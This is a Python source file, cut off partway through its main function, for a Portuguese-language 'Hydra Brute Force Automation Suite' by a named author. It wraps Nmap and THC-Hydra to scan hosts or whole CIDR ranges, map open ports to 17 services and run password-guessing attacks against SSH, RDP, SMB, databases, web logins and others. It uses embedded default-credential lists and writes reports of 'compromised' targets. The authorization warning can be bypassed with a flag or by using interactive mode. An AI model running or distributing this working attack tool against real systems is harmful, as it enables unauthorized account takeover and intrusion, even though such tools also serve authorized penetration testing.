#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          HYDRA BRUTE FORCE AUTOMATION SUITE v2.0                ║
║          Universal Multi-Target / Multi-Service Pentest          ║
║                                                                  ║
║  Author : Magioli (Rafael Magioli Maciel)                       ║
║  Tools  : THC-Hydra, Nmap, Python 3                             ║
║                                                                  ║
║  ⚠️  AUTHORIZED USE ONLY — Ensure written permission before     ║
║      executing against any target.                               ║
╚══════════════════════════════════════════════════════════════════╝

Serviços suportados (17):
  FTP (21) | SSH (22) | Telnet (23) | SMTP (25/587) | HTTP (80)
  POP3 (110) | IMAP (143) | SNMP (161) | LDAP (389) | SMB (445)
  HTTPS (443) | MSSQL (1433) | MySQL (3306) | RDP (3389)
  PostgreSQL (5432) | VNC (5900) | HTTP-POST-FORM

Uso:
  python3 hydra_bruteforce_suite.py -T 192.168.1.100
  python3 hydra_bruteforce_suite.py -T alvo.com --services ssh,ftp -t 8
  python3 hydra_bruteforce_suite.py -T 10.0.0.0/24 --recon-only
  python3 hydra_bruteforce_suite.py --targets-file hosts.txt --all-services
  python3 hydra_bruteforce_suite.py  (modo interativo)
"""

import subprocess
import argparse
import os
import sys
import json
import socket
import datetime
import shutil
import ipaddress
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional


# ─────────────────────────────────────────────────────────────────
# CONFIGURAÇÃO DE SERVIÇOS
# ─────────────────────────────────────────────────────────────────

@dataclass
class ServiceConfig:
    """Configuração de cada serviço alvo."""
    name: str
    port: int
    hydra_module: str
    default_users: list = field(default_factory=list)
    default_passes: list = field(default_factory=list)
    extra_args: list = field(default_factory=list)
    nmap_port: Optional[int] = None

    def __post_init__(self):
        if self.nmap_port is None:
            self.nmap_port = self.port


SERVICES = {
    "ftp": ServiceConfig(
        name="FTP", port=21, hydra_module="ftp",
        default_users=[
            "admin", "ftp", "anonymous", "root", "user", "test",
            "backup", "ftpuser", "www-data", "administrator",
            "webmaster", "upload", "deploy", "svc_ftp",
        ],
        default_passes=[
            "admin", "password", "123456", "ftp", "anonymous",
            "root", "letmein", "12345678", "qwerty", "",
            "P@ssw0rd", "changeme", "welcome", "test123",
        ],
    ),
    "ssh": ServiceConfig(
        name="SSH", port=22, hydra_module="ssh",
        default_users=[
            "root", "admin", "ubuntu", "user", "deploy", "centos",
            "ec2-user", "git", "postgres", "mysql", "oracle",
            "ansible", "vagrant", "pi", "kali", "ftpuser",
        ],
        default_passes=[
            "admin", "password", "123456", "root", "toor", "ubuntu",
            "changeme", "letmein", "passw0rd", "12345678", "P@ssw0rd",
            "Welcome1", "test", "1234", "master", "vagrant",
        ],
        extra_args=["-t", "4"],
    ),
    "telnet": ServiceConfig(
        name="Telnet", port=23, hydra_module="telnet",
        default_users=[
            "admin", "root", "user", "guest", "test", "operator",
            "supervisor", "manager", "support", "cisco", "enable",
        ],
        default_passes=[
            "admin", "password", "123456", "root", "guest", "1234",
            "default", "telnet", "cisco", "enable", "changeme",
        ],
    ),
    "smtp": ServiceConfig(
        name="SMTP", port=587, hydra_module="smtp",
        default_users=[
            "admin", "postmaster", "root", "info", "mail",
            "support", "contact", "noreply", "test",
        ],
        default_passes=[
            "admin", "password", "123456", "P@ssw0rd", "mail",
            "smtp", "changeme", "welcome",
        ],
        nmap_port=25,
    ),
    "smb": ServiceConfig(
        name="SMB", port=445, hydra_module="smb",
        default_users=[
            "administrator", "admin", "guest", "user", "smbuser",
            "backup", "service", "svc_smb",
        ],
        default_passes=[
            "admin", "password", "123456", "P@ssw0rd", "Welcome1",
            "letmein", "changeme", "Summer2024", "Winter2024",
        ],
    ),
    "http-get": ServiceConfig(
        name="HTTP Basic Auth", port=80, hydra_module="http-get",
        default_users=[
            "admin", "root", "user", "administrator", "manager",
            "webmaster", "test", "operator",
        ],
        default_passes=[
            "admin", "password", "123456", "admin123", "root",
            "toor", "letmein", "P@ssw0rd", "welcome",
        ],
        extra_args=["/"],
    ),
    "https-get": ServiceConfig(
        name="HTTPS Basic Auth", port=443, hydra_module="https-get",
        default_users=[
            "admin", "root", "user", "administrator", "manager",
            "webmaster",
        ],
        default_passes=[
            "admin", "password", "123456", "admin123", "root",
            "P@ssw0rd", "letmein",
        ],
        extra_args=["/"],
    ),
    "http-post-form": ServiceConfig(
        name="HTTP POST Form", port=80, hydra_module="http-post-form",
        default_users=[
            "admin", "root", "user", "administrator", "test",
            "manager", "operator",
        ],
        default_passes=[
            "admin", "password", "123456", "admin123", "root",
            "P@ssw0rd", "letmein", "welcome", "test123",
        ],
        extra_args=["/login:username=^USER^&password=^PASS^:F=Invalid"],
    ),
    "rdp": ServiceConfig(
        name="RDP", port=3389, hydra_module="rdp",
        default_users=[
            "administrator", "admin", "user", "rdpuser",
            "sysadmin", "helpdesk",
        ],
        default_passes=[
            "admin", "password", "P@ssw0rd", "Welcome1", "123456",
            "changeme", "Summer2024", "Company123",
        ],
        extra_args=["-t", "1"],
    ),
    "mysql": ServiceConfig(
        name="MySQL", port=3306, hydra_module="mysql",
        default_users=[
            "root", "admin", "mysql", "dba", "test", "user",
            "dbadmin", "app", "wordpress", "drupal",
        ],
        default_passes=[
            "root", "mysql", "password", "123456", "admin", "toor",
            "dbpass", "", "P@ssw0rd", "test",
        ],
    ),
    "postgres": ServiceConfig(
        name="PostgreSQL", port=5432, hydra_module="postgres",
        default_users=[
            "postgres", "admin", "root", "user", "dba", "app",
            "pgadmin", "replication",
        ],
        default_passes=[
            "postgres", "password", "admin", "123456", "root",
            "changeme", "P@ssw0rd", "pgpass", "",
        ],
    ),
    "vnc": ServiceConfig(
        name="VNC", port=5900, hydra_module="vnc",
        default_users=[""],
        default_passes=[
            "password", "123456", "vnc", "admin", "1234", "test",
            "letmein", "changeme", "P@ssw0rd", "default",
        ],
    ),
    "pop3": ServiceConfig(
        name="POP3", port=110, hydra_module="pop3",
        default_users=[
            "admin", "user", "test", "postmaster", "info",
            "mail", "support",
        ],
        default_passes=[
            "admin", "password", "123456", "mail", "P@ssw0rd",
            "changeme", "test",
        ],
    ),
    "imap": ServiceConfig(
        name="IMAP", port=143, hydra_module="imap",
        default_users=[
            "admin", "user", "test", "postmaster", "info",
            "mail", "support",
        ],
        default_passes=[
            "admin", "password", "123456", "mail", "P@ssw0rd",
            "changeme",
        ],
    ),
    "snmp": ServiceConfig(
        name="SNMP", port=161, hydra_module="snmp",
        default_users=[""],
        default_passes=[
            "public", "private", "community", "snmp", "admin",
            "default", "monitor", "manager", "test",
        ],
    ),
    "ldap": ServiceConfig(
        name="LDAP", port=389, hydra_module="ldap3",
        default_users=[
            "admin", "administrator", "cn=admin", "cn=Manager",
            "uid=admin", "root",
        ],
        default_passes=[
            "admin", "password", "ldap", "123456", "P@ssw0rd",
            "changeme", "secret",
        ],
    ),
    "mssql": ServiceConfig(
        name="MSSQL", port=1433, hydra_module="mssql",
        default_users=[
            "sa", "admin", "dba", "user", "test", "sysadmin",
        ],
        default_passes=[
            "sa", "password", "123456", "admin", "P@ssw0rd",
            "Sa123456", "master", "changeme",
        ],
    ),
}


# ─────────────────────────────────────────────────────────────────
# CLASSES AUXILIARES
# ─────────────────────────────────────────────────────────────────

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

    @staticmethod
    def disable():
        for attr in ["RED", "GREEN", "YELLOW", "BLUE", "MAGENTA",
                      "CYAN", "WHITE", "BOLD", "DIM", "RESET"]:
            setattr(Colors, attr, "")


C = Colors


def banner():
    print(f"""
{C.RED}{C.BOLD}
  ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗
  ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
  ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
  ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
  ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
  ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{C.RESET}
{C.CYAN}  ╔═══ Brute Force Automation Suite v2.0 ═══╗
  ║  Universal · Multi-Target · Multi-Service   ║
  ║  17 serviços · Nmap recon · SecLists auto   ║
  ╚═════════════════════════════════════════════╝{C.RESET}
""")


def log(level: str, msg: str):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    icons = {
        "info":   f"{C.BLUE}[ℹ]{C.RESET}",
        "ok":     f"{C.GREEN}[✓]{C.RESET}",
        "warn":   f"{C.YELLOW}[⚠]{C.RESET}",
        "error":  f"{C.RED}[✗]{C.RESET}",
        "attack": f"{C.RED}{C.BOLD}[⚔]{C.RESET}",
        "found":  f"{C.GREEN}{C.BOLD}[🔑]{C.RESET}",
        "recon":  f"{C.MAGENTA}[🔍]{C.RESET}",
        "target": f"{C.CYAN}{C.BOLD}[🎯]{C.RESET}",
    }
    icon = icons.get(level, "[?]")
    print(f"  {C.DIM}{ts}{C.RESET} {icon} {msg}")


@dataclass
class Finding:
    service: str
    host: str
    port: int
    username: str
    password: str
    timestamp: str = field(
        default_factory=lambda: datetime.datetime.now().isoformat()
    )


# ─────────────────────────────────────────────────────────────────
# RESOLUÇÃO DE ALVOS
# ─────────────────────────────────────────────────────────────────

def resolve_targets(target_arg: Optional[str],
                    targets_file: Optional[str]) -> list[str]:
    """
    Resolve alvos a partir de:
      - IP / hostname único
      - CIDR (ex: 192.168.1.0/24)
      - Arquivo com um alvo por linha
    Suporta combinação de -T e --targets-file.
    """
    targets = []

    # Arquivo de alvos
    if targets_file:
        if not os.path.isfile(targets_file):
            log("error", f"Arquivo não encontrado: {targets_file}")
            sys.exit(1)
        with open(targets_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
        log("info", (
            f"Carregados {C.BOLD}{len(targets)}{C.RESET} "
            f"alvos de {targets_file}"
        ))

    # Target via argumento
    if target_arg:
        try:
            network = ipaddress.ip_network(target_arg, strict=False)
            if network.num_addresses > 1:
                hosts = [str(h) for h in network.hosts()]
                if len(hosts) > 256:
                    log("warn", f"Range grande ({len(hosts)}). Limitando a 256.")
                    hosts = hosts[:256]
                targets.extend(hosts)
                log("info", (
                    f"CIDR: {target_arg} → "
                    f"{C.BOLD}{len(hosts)}{C.RESET} hosts"
                ))
            else:
                targets.append(target_arg)
        except ValueError:
            targets.append(target_arg)

    # Dedup mantendo ordem
    seen = set()
    unique = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            unique.append(t)

    if not unique:
        log("error", "Nenhum alvo especificado. Use -T ou --targets-file")
        sys.exit(1)

    return unique


def resolve_dns(target: str) -> Optional[str]:
    try:
        ip = socket.gethostbyname(target)
        if ip != target:
            log("ok", f"DNS: {target} → {C.BOLD}{ip}{C.RESET}")
        return ip
    except socket.gaierror:
        log("error", f"DNS falhou: {target}")
        return None


# ─────────────────────────────────────────────────────────────────
# RECONHECIMENTO NMAP
# ─────────────────────────────────────────────────────────────────

def nmap_scan(target: str, ports: str, aggressive: bool = False,
              timeout: int = 300) -> dict:
    log("recon", f"Nmap em {C.BOLD}{target}{C.RESET}...")

    results = {"target": target, "ip": None, "open_ports": [], "services": {}}

    ip = resolve_dns(target)
    if not ip:
        return results
    results["ip"] = ip

    cmd = ["nmap", "-sV", "--open", "-p", ports, "-T4", "--reason"]
    if aggressive:
        cmd.extend(["-sC", "-A"])
    cmd.extend([
        "-oN", f"/tmp/nmap_{target.replace('/', '_')}.txt",
        target,
    ])

    try:
        log("recon", f"$ {C.DIM}{' '.join(cmd)}{C.RESET}")
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )

        for line in proc.stdout.splitlines():
            line = line.strip()
            if "/tcp" in line and "open" in line:
                parts = line.split()
                port = int(parts[0].split("/")[0])
                state = parts[1] if len(parts) > 1 else "unknown"
                service = parts[2] if len(parts) > 2 else "unknown"
                version = " ".join(parts[3:]) if len(parts) > 3 else ""

                results["open_ports"].append(port)
                results["services"][str(port)] = {
                    "state": state,
                    "service": service,
                    "version": version.strip(),
                }
                log("ok", (
                    f"  {C.GREEN}{port}/tcp{C.RESET} → "
                    f"{C.CYAN}{service}{C.RESET} {C.DIM}{version}{C.RESET}"
                ))

        total = len(results["open_ports"])
        if total:
            log("ok", f"Total: {C.BOLD}{total}{C.RESET} porta(s) aberta(s)")
        else:
            log("warn", "Nenhuma porta aberta no range.")

    except FileNotFoundError:
        log("error", "Nmap não instalado. sudo apt install nmap")
    except subprocess.TimeoutExpired:
        log("error", f"Nmap timeout ({timeout}s)")

    return results


def auto_detect_services(recon: dict) -> list[str]:
    port_map = {}
    for key, svc in SERVICES.items():
        port_map[svc.port] = key
        if svc.nmap_port and svc.nmap_port != svc.port:
            port_map[svc.nmap_port] = key

    detected = []
    for port in recon.get("open_ports", []):
        if port in port_map:
            svc_key = port_map[port]
            if svc_key not in detected:
                detected.append(svc_key)
                log("info", (
                    f"  Mapeado: {C.BOLD}{SERVICES[svc_key].name}{C.RESET} "
                    f"(porta {port})"
                ))
    return detected


# ─────────────────────────────────────────────────────────────────
# WORDLISTS
# ─────────────────────────────────────────────────────────────────

SECLISTS_USERS = [
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
    "/usr/share/wordlists/metasploit/unix_users.txt",
]
SECLISTS_PASSES = [
    "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/metasploit/unix_passwords.txt",
]


def find_seclists(candidates: list[str]) -> Optional[str]:
    for path in candidates:
        if os.path.isfile(path):
            return path
    return None


def prepare_wordlist(items: list, label: str, outdir: str) -> str:
    filepath = os.path.join(outdir, f"{label}.txt")
    with open(filepath, "w", encoding='utf-8') as f:
        for item in items:
            f.write(item + "\n")
    return filepath


def get_wordlist(custom: Optional[str], defaults: list,
                 label: str, outdir: str,
                 use_seclists: bool = True,
                 seclists_candidates: Optional[list] = None) -> str:
    """
    Prioridade: 1) custom  2) SecLists  3) embeddada
    """
    if custom and os.path.isfile(custom):
        wc = sum(1 for _ in open(custom, encoding='utf-8'))
        log("info", f"Wordlist: {custom} ({wc} entradas)")
        return custom

    if use_seclists and seclists_candidates:
        found = find_seclists(seclists_candidates)
        if found:
            wc = sum(1 for _ in open(found, encoding='utf-8'))
            log("info", f"SecLists: {found} ({wc} entradas)")
            return found

    path = prepare_wordlist(defaults, label, outdir)
    log("info", f"Wordlist embeddada: {path} ({len(defaults)} entradas)")
    return path


# ─────────────────────────────────────────────────────────────────
# ATAQUE HYDRA
# ─────────────────────────────────────────────────────────────────

def check_hydra() -> bool:
    if shutil.which("hydra"):
        try:
            proc = subprocess.run(
                ["hydra", "-h"], capture_output=True, text=True
            )
            for line in proc.stdout.splitlines():
                if "Hydra" in line and ("v" in line or "Version" in line):
                    log("ok", f"Hydra: {line.strip()}")
                    return True
        except Exception:
            pass
        log("ok", "Hydra encontrado")
        return True
    log("error", "Hydra NÃO encontrado. sudo apt install hydra")
    return False


def run_hydra(
    target: str,
    service_key: str,
    userlist: str,
    passlist: str,
    threads: int = 6,
    port: Optional[int] = None,
    verbose: bool = False,
    timeout: int = 600,
    output_dir: str = "/tmp",
    exit_on_first: bool = True,
    wait_time: int = 10,
) -> list[Finding]:
    svc = SERVICES[service_key]
    target_port = port or svc.port
    findings = []

    log("attack", (
        f"Atacando {C.RED}{C.BOLD}{svc.name}{C.RESET} → "
        f"{C.BOLD}{target}:{target_port}{C.RESET}"
    ))

    safe_name = target.replace("/", "_").replace(":", "_")
    output_file = os.path.join(
        output_dir, f"hydra_{service_key}_{safe_name}.txt"
    )

    cmd = [
        "hydra",
        "-L", userlist,
        "-P", passlist,
        "-t", str(threads),
        "-o", output_file,
        "-I",
        "-w", str(wait_time),
    ]

    if exit_on_first:
        cmd.append("-f")
    if verbose:
        cmd.append("-V")

    extra = svc.extra_args.copy()

    if service_key in ("http-post-form", "https-post-form"):
        form_str = extra[0] if extra else \
            "/login:user=^USER^&pass=^PASS^:F=Invalid"
        cmd.extend([
            "-s", str(target_port), target,
            svc.hydra_module, form_str,
        ])

    elif service_key in ("http-get", "https-get"):
        path = extra[0] if extra else "/"
        cmd.extend([
            "-s", str(target_port), target,
            svc.hydra_module, path,
        ])

    else:
        for i in range(0, len(extra), 2):
            if i + 1 < len(extra):
                cmd.extend([extra[i], extra[i + 1]])
        cmd.extend([
            "-s", str(target_port),
            f"{svc.hydra_module}://{target}",
        ])

    log("info", f"$ {C.DIM}{' '.join(cmd)}{C.RESET}")

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        output = proc.stdout + "\n" + proc.stderr

        for line in output.splitlines():
            if "login:" in line and "password:" in line:
                f = _parse_hydra_line(line, svc.name, target, target_port)
                if f:
                    findings.append(f)
                    log("found", (
                        f"{C.GREEN}{C.BOLD}CREDENCIAL VÁLIDA!{C.RESET} "
                        f"→ {svc.name} | {f.username}:{f.password}"
                    ))

        # Dedup do output file
        if os.path.isfile(output_file):
            existing = {(fd.username, fd.password) for fd in findings}
            with open(output_file) as fh:
                for line in fh:
                    if "login:" in line and "password:" in line:
                        f = _parse_hydra_line(
                            line, svc.name, target, target_port
                        )
                        if f and (f.username, f.password) not in existing:
                            findings.append(f)
                            existing.add((f.username, f.password))

        if not findings:
            log("warn", f"Sem credenciais para {svc.name}")
        else:
            log("ok", (
                f"{C.GREEN}{len(findings)}{C.RESET} credencial(is) "
                f"em {svc.name}"
            ))

    except FileNotFoundError:
        log("error", "Hydra não encontrado!")
    except subprocess.TimeoutExpired:
        log("error", f"Timeout ({timeout}s) em {svc.name}")
    except Exception as e:
        log("error", f"Erro: {e}")

    return findings


def _parse_hydra_line(line: str, service: str, host: str,
                      port: int) -> Optional[Finding]:
    try:
        if "login:" in line and "password:" in line:
            parts = line.split("login:")
            rest = parts[1].strip()
            if "password:" in rest:
                user_part, pass_part = rest.split("password:", 1)
                user = user_part.strip()
                passwd = pass_part.strip()
                if user:
                    return Finding(
                        service=service, host=host, port=port,
                        username=user, password=passwd,
                    )
    except (IndexError, ValueError):
        pass
    return None


# ─────────────────────────────────────────────────────────────────
# RELATÓRIOS
# ─────────────────────────────────────────────────────────────────

class ReportGenerator:
    def __init__(self, targets: list[str], output_dir: str):
        self.targets = targets
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[Finding] = []
        self.recon_results: dict = {}
        self.start_time = datetime.datetime.now()
        self.services_tested: list[str] = []

    def add_finding(self, finding: Finding):
        self.findings.append(finding)

    def add_findings(self, findings: list[Finding]):
        self.findings.extend(findings)

    def set_recon(self, target: str, recon: dict):
        self.recon_results[target] = recon

    def _ts(self) -> str:
        return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    def generate_txt(self) -> str:
        lines = []
        lines.append("=" * 72)
        lines.append("  HYDRA BRUTE FORCE SUITE v2.0 — RELATÓRIO")
        lines.append("=" * 72)
        lines.append(f"  Alvos      : {', '.join(self.targets)}")
        lines.append(f"  Início     : {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"  Término    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"  Serviços   : {', '.join(self.services_tested)}")
        lines.append(f"  Credenciais: {len(self.findings)}")
        lines.append("=" * 72)

        if self.recon_results:
            lines.append("\n[RECONHECIMENTO]")
            for target, recon in self.recon_results.items():
                lines.append(f"\n  --- {target} ---")
                lines.append(f"  IP: {recon.get('ip', 'N/A')}")
                ports = recon.get("open_ports", [])
                lines.append(f"  Portas: {', '.join(map(str, ports))}")
                for p, info in recon.get("services", {}).items():
                    lines.append(
                        f"    {p}/tcp → {info['service']} "
                        f"{info.get('version', '')}"
                    )

        if self.findings:
            lines.append("\n[CREDENCIAIS VÁLIDAS]")
            lines.append("-" * 72)
            lines.append(
                f"  {'Host':<28} {'Serviço':<14} {'Porta':<7} "
                f"{'User':<16} {'Pass':<16}"
            )
            lines.append("-" * 72)
            for f in self.findings:
                lines.append(
                    f"  {f.host:<28} {f.service:<14} {f.port:<7} "
                    f"{f.username:<16} {f.password:<16}"
                )
            lines.append("-" * 72)
        else:
            lines.append("\n[!] Nenhuma credencial encontrada.")

        lines.append("\n" + "=" * 72)
        lines.append("  ⚠️  CONFIDENCIAL — Uso autorizado apenas.")
        lines.append("=" * 72)

        report = "\n".join(lines)
        filepath = self.output_dir / f"bf_report_{self._ts()}.txt"
        filepath.write_text(report)
        return str(filepath)

    def generate_json(self) -> str:
        data = {
            "metadata": {
                "targets": self.targets,
                "start_time": self.start_time.isoformat(),
                "end_time": datetime.datetime.now().isoformat(),
                "tool": "Hydra Brute Force Suite v2.0",
                "services_tested": self.services_tested,
            },
            "recon": self.recon_results,
            "findings": [asdict(f) for f in self.findings],
            "summary": {
                "total_credentials": len(self.findings),
                "targets_compromised": list(
                    set(f.host for f in self.findings)
                ),
                "services_compromised": list(
                    set(f.service for f in self.findings)
                ),
            },
        }
        filepath = self.output_dir / f"bf_report_{self._ts()}.json"
        filepath.write_text(json.dumps(data, indent=2, ensure_ascii=False))
        return str(filepath)

    def generate_csv(self) -> str:
        filepath = self.output_dir / f"bf_findings_{self._ts()}.csv"
        with open(filepath, "w") as f:
            f.write("timestamp,host,service,port,username,password\n")
            for fd in self.findings:
                # Escape commas in password
                pw = fd.password.replace('"', '""')
                f.write(
                    f'{fd.timestamp},{fd.host},{fd.service},'
                    f'{fd.port},{fd.username},"{pw}"\n'
                )
        return str(filepath)


# ─────────────────────────────────────────────────────────────────
# MENU INTERATIVO
# ─────────────────────────────────────────────────────────────────

def interactive_menu() -> dict:
    print(f"\n  {C.CYAN}{C.BOLD}═══ MODO INTERATIVO ═══{C.RESET}\n")
    config = {}

    # ── Target ──
    target = input(
        f"  {C.BOLD}Alvo (IP, hostname, CIDR ou arquivo): {C.RESET}"
    ).strip()
    if not target:
        log("error", "Alvo obrigatório.")
        sys.exit(1)

    # Checar se é arquivo
    if os.path.isfile(target):
        config["targets_file"] = target
        config["target"] = None
    else:
        config["target"] = target
        config["targets_file"] = None

    # ── Serviços ──
    print(f"\n  {C.CYAN}Serviços disponíveis:{C.RESET}")
    svc_list = list(SERVICES.keys())
    for i, key in enumerate(svc_list, 1):
        svc = SERVICES[key]
        print(f"    {C.BOLD}{i:>2}{C.RESET}. {svc.name:<22} (porta {svc.port})")
    print(f"    {C.BOLD} A{C.RESET}. AUTO-DETECT (Nmap)")
    print(f"    {C.BOLD} *{C.RESET}. TODOS")

    choice = input(
        f"\n  {C.BOLD}Selecione (ex: 1,2,5 / A / *): {C.RESET}"
    ).strip()

    if choice.upper() == "A" or not choice:
        config["services"] = None
    elif choice == "*":
        config["services"] = ",".join(svc_list)
    else:
        selected = []
        for c in choice.split(","):
            c = c.strip()
            if c.isdigit():
                idx = int(c) - 1
                if 0 <= idx < len(svc_list):
                    selected.append(svc_list[idx])
            elif c in SERVICES:
                selected.append(c)
        config["services"] = ",".join(selected) if selected else None

    # ── Wordlists ──
    ul = input(
        f"  {C.BOLD}Wordlist de users (Enter=auto): {C.RESET}"
    ).strip()
    config["userlist"] = ul if ul else None

    pl = input(
        f"  {C.BOLD}Wordlist de senhas (Enter=auto): {C.RESET}"
    ).strip()
    config["passlist"] = pl if pl else None

    # ── Threads ──
    thr = input(
        f"  {C.BOLD}Threads [{C.GREEN}6{C.RESET}{C.BOLD}]: {C.RESET}"
    ).strip()
    config["threads"] = int(thr) if thr.isdigit() else 6

    # ── Verbose ──
    verb = input(
        f"  {C.BOLD}Verbose? (s/N): {C.RESET}"
    ).strip().lower()
    config["verbose"] = verb in ("s", "y", "sim", "yes")

    return config


# ─────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────

def list_services():
    """Imprime tabela de serviços disponíveis."""
    print(f"\n  {C.CYAN}{C.BOLD}Serviços disponíveis:{C.RESET}\n")
    print(f"  {'Key':<18} {'Nome':<22} {'Porta':<8} {'Módulo Hydra'}")
    print(f"  {'─' * 18} {'─' * 22} {'─' * 8} {'─' * 16}")
    for key, svc in SERVICES.items():
        print(
            f"  {C.BOLD}{key:<18}{C.RESET} {svc.name:<22} "
            f"{svc.port:<8} {svc.hydra_module}"
        )
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Hydra Brute Force Automation Suite v2.0 — Universal",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.CYAN}Exemplos:{C.RESET}
  %(prog)s -T 192.168.1.100
  %(prog)s -T alvo.com.br --services ssh,ftp,smb
  %(prog)s -T 10.0.0.0/24 --recon-only
  %(prog)s --targets-file hosts.txt --all-services
  %(prog)s -T alvo.com -U users.txt -P rockyou.txt -t 16 -v
  %(prog)s -T alvo.com --services http-post-form \\
           --http-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
  %(prog)s --list-services
  %(prog)s  (sem args → modo interativo)
        """,
    )

    # ── Alvos ──
    g1 = parser.add_argument_group("Alvos")
    g1.add_argument(
        "--target", "-T",
        help="Alvo: IP, hostname ou CIDR.",
    )
    g1.add_argument(
        "--targets-file", "-TF",
        help="Arquivo com alvos (um por linha, # = comentário).",
    )

    # ── Serviços ──
    g2 = parser.add_argument_group("Serviços")
    g2.add_argument(
        "--services", "-s",
        help=f"Serviços (comma-separated). Se omitido, auto-detecta via Nmap.",
    )
    g2.add_argument(
        "--all-services", action="store_true",
        help="Atacar TODOS os 17 serviços.",
    )
    g2.add_argument(
        "--list-services", action="store_true",
        help="Listar serviços disponíveis e sair.",
    )

    # ── Wordlists ──
    g3 = parser.add_argument_group("Wordlists")
    g3.add_argument("--userlist", "-U", help="Wordlist de usernames.")
    g3.add_argument("--passlist", "-P", help="Wordlist de senhas.")
    g3.add_argument(
        "--no-seclists", action="store_true",
        help="Não usar SecLists do sistema.",
    )

    # ── Ataque ──
    g4 = parser.add_argument_group("Ataque")
    g4.add_argument("--threads", "-t", type=int, default=6, help="Threads (default: 6).")
    g4.add_argument("--timeout", type=int, default=600, help="Timeout por serviço (default: 600s).")
    g4.add_argument("--port", type=int, help="Porta customizada.")
    g4.add_argument("--http-form", help="Form string http-post-form.")
    g4.add_argument(
        "--continue-on-found", action="store_true",
        help="Não parar no primeiro login.",
    )

    # ── Recon ──
    g5 = parser.add_argument_group("Reconhecimento")
    g5.add_argument("--recon-only", action="store_true", help="Só Nmap, sem ataques.")
    g5.add_argument("--skip-recon", action="store_true", help="Pular Nmap.")
    g5.add_argument(
        "--nmap-ports",
        default="21,22,23,25,80,110,143,161,389,443,445,587,"
                "1433,3306,3389,5432,5900,8080,8443",
        help="Portas Nmap.",
    )
    g5.add_argument("--aggressive-scan", action="store_true", help="Nmap -sC -A.")

    # ── Output ──
    g6 = parser.add_argument_group("Output")
    g6.add_argument("--output", "-o", default="./results", help="Diretório output.")
    g6.add_argument("--verbose", "-v", action="store_true", help="Verbose Hydra.")
    g6.add_argument("--no-color", action="store_true", help="Sem cores.")
    g6.add_argument("--yes", "-y", action="store_true", help="Skip confirmação.")

    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    banner()

    # ── List services ──
    if args.list_services:
        list_services()
        sys.exit(0)

    # ── Modo interativo ──
    if not args.target and not args.targets_file:
        config = interactive_menu()
        args.target = config.get("target")
        args.targets_file = config.get("targets_file")
        if config.get("services"):
            args.services = config["services"]
        if config.get("userlist"):
            args.userlist = config["userlist"]
        if config.get("passlist"):
            args.passlist = config["passlist"]
        args.threads = config.get("threads", 6)
        args.verbose = config.get("verbose", False)
        args.yes = True

    # ── Resolver alvos ──
    targets = resolve_targets(args.target, args.targets_file)
    log("target", f"Total: {C.BOLD}{len(targets)}{C.RESET} alvo(s)")
    for t in targets:
        log("target", f"  → {t}")

    # ── Checar Hydra ──
    if not args.recon_only and not check_hydra():
        sys.exit(1)

    # ── Confirmação ──
    if not args.yes:
        print(f"\n  {C.YELLOW}{C.BOLD}⚠️  AVISO DE AUTORIZAÇÃO{C.RESET}")
        print(f"  {C.YELLOW}Ataques serão executados contra:{C.RESET}")
        for t in targets[:10]:
            print(f"    {C.BOLD}→ {t}{C.RESET}")
        if len(targets) > 10:
            print(f"    {C.DIM}... e mais {len(targets) - 10} alvos{C.RESET}")
        print(f"\n  {C.YELLOW}Confirme AUTORIZAÇÃO ESCRITA.{C.RESET}\n")

        try:
            resp = input(f"  {C.BOLD}Confirma? [y/N]: {C.RESET}").strip().lower()
            if resp not in ("y", "yes", "s", "sim"):
                log("info", "Cancelado.")
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            print()
            sys.exit(0)

    # ── Setup ──
    os.makedirs(args.output, exist_ok=True)
    wl_dir = os.path.join(args.output, "wordlists")
    os.makedirs(wl_dir, exist_ok=True)

    report = ReportGenerator(targets, args.output)
    use_sl = not args.no_seclists

    # ════════════════════════════════════════════════════════════════
    # LOOP POR ALVO
    # ════════════════════════════════════════════════════════════════

    for idx, target in enumerate(targets, 1):
        print(f"\n{'━' * 65}")
        print(
            f"  {C.CYAN}{C.BOLD}🎯 ALVO [{idx}/{len(targets)}]: "
            f"{target}{C.RESET}"
        )
        print(f"{'━' * 65}")

        # ── RECON ──
        recon = {}
        svcs = []

        if not args.skip_recon:
            print(f"\n  {C.MAGENTA}{C.BOLD}── RECONHECIMENTO ──{C.RESET}\n")
            recon = nmap_scan(
                target, args.nmap_ports,
